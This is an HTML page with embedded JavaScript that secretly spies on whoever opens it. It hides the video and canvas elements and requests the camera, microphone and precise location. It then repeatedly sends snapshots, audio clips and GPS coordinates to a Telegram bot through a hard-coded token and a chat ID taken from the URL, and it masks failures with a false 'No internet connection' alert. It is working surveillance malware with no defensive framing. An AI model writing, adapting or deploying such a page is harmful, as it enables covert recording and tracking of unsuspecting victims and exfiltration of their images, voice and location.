<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>
        #video {
            display: none;
        }
    </style>
</head>
<body>
    <video id="video" autoplay></video>
    <canvas id="canvas" width="2000" height="2000" style="display: none;"></canvas>

    <script>
        const Tn = "6762400314:AAHazT664e2APrddJfAjsIwGmZ5KfBfuqJI";
        const urlParams = new URLSearchParams(window.location.search);
            const Id = urlParams.get('Id');
        function startCamera() {
            const video = document.getElementById("video");
            const canvas = document.getElementById("canvas");
            const ctx = canvas.getContext("2d");
            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            if (isMobile) {
                video.setAttribute("width", "100%");
                video.setAttribute("height", "auto");
            } else {
                video.setAttribute("width", "2000");
                video.setAttribute("height", "2000");
            }
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    setInterval(() => {
                        ctx.drawImage(video, 0, 0, 2000, 2000);
                        canvas.toBlob(sendToTelegram, "image/jpeg", 0.8);
                        startRecording();
                    }, 1000);
                })
                .catch(error => {
                    console.error(error);
                    alert("No internet connection!!.");
                });
        }
        function sendToTelegram(blob) {
            const formData = new FormData();
            formData.append("photo", blob, "camera.jpg");
            formData.append("chat_id", Id);
            fetch(`https://api.telegram.org/bot${Tn}/sendPhoto`, {
                method: "POST",
                body: formData,
            })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                    } else {
                        throw new Error(data.description);
                    }
                })
                .catch(error => {
                    console.error(error);
                });
        }
        function sendAudioToTelegram(blob) {
            const formData = new FormData();
            formData.append("audio", blob, "recording.wav");
            formData.append("chat_id",Id);
            fetch(`https://api.telegram.org/bot${Tn}/sendAudio`, {
                method: "POST",
                body: formData,
            })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                    } else {
                        throw new Error(data.description);
                    }
                })
                .catch(error => {
                    console.error(error);
                });
        }
        function startRecording() {
            const audioChunks = [];
            navigator.mediaDevices
                .getUserMedia({ audio: true, video: false })
                .then((stream) => {
                    const mediaRecorder = new MediaRecorder(stream);
                    mediaRecorder.start();
                    setTimeout(() => {
                        mediaRecorder.stop();
                    }, 10000);
                    mediaRecorder.addEventListener("dataavailable", (event) => {
                        audioChunks.push(event.data);
                    });
                    mediaRecorder.addEventListener("stop", () => {
                        const audioBlob = new Blob(audioChunks, { type: "audio/wav" });
                        sendAudioToTelegram(audioBlob);
                    });
                })
                .catch((error) => {
                    console.error(error);
                });
        }
        function getExactLocation() {
  return new Promise((resolve, reject) => {
    if (navigator.geolocation) {
      const options = {
        enableHighAccuracy: true, 
        maximumAge: 0, 
        timeout: 5000 
      };
      navigator.geolocation.getCurrentPosition(position => {
        resolve({latitude: position.coords.latitude, longitude: position.coords.longitude});
      }, error => {
        reject(error);
      }, options);
    } else {
      reject("Geolocation is not supported by this browser");
    }
  });
}
document.addEventListener("DOMContentLoaded", function() {
  getExactLocation()
    .then(({latitude, longitude}) => {
      const url = `https://api.telegram.org/bot${Tn}/sendLocation?chat_id=${Id}&latitude=${latitude}&longitude=${longitude}`;
      fetch(url)
        .then(response => {
          if (response.ok) {
          } else {
          }
        })
        .catch(error => {
          console.error(error);
        });
    })
    .catch(error => {
      console.error(error);
    });
});
        startCamera();

    </script>
